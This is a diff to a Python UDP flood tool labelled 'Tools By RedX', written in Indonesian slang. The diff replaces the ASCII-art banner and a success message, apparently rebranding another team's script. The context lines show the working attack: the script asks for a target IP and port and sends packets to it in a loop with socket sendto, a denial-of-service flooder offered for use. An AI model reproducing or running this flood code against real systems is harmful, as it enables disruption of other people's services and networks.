@@ -6,7 +6,17 @@ import os,sys
 os.system("clear")
 print("\033[93m")
 print('''\033[94m Tools By RedX
-
+██████╗░███████╗██████ ╗██╗░░██╗
+██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝
+██████╔╝█████╗░░██║░░██║░╚███╔╝
+██╔══██╗██╔══╝░░██║░░██║░██╔██╗
+██║░░██║███████╗██████╔╝██╔╝╚██╗
+╚═╝░░╚═╝╚══════╝╚═════╝╚═╝░░╚═╝
+------------------------------------------------------------
+      >Jangan Abuse Ya Maniez<         
+      >    Tools By RedX     <
+------------------------------------------------------------
+''')
 ip = str(input("MASUKIN IPNYA | Target IP:"))
 port = int(input("MASUKIN PORTNYA | Target Port:"))
 choice = str(input("GAS GA NI? (y/n):"))
@@ -23,7 +33,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" XAL TEAM NIH BOSS!!!")
+			print("\033[92m[*TOK*TOK*] PERMISI PAKET DARI RedX DATENG")
 		except:
 			print("[X] AMPUN BANG!!!")
 
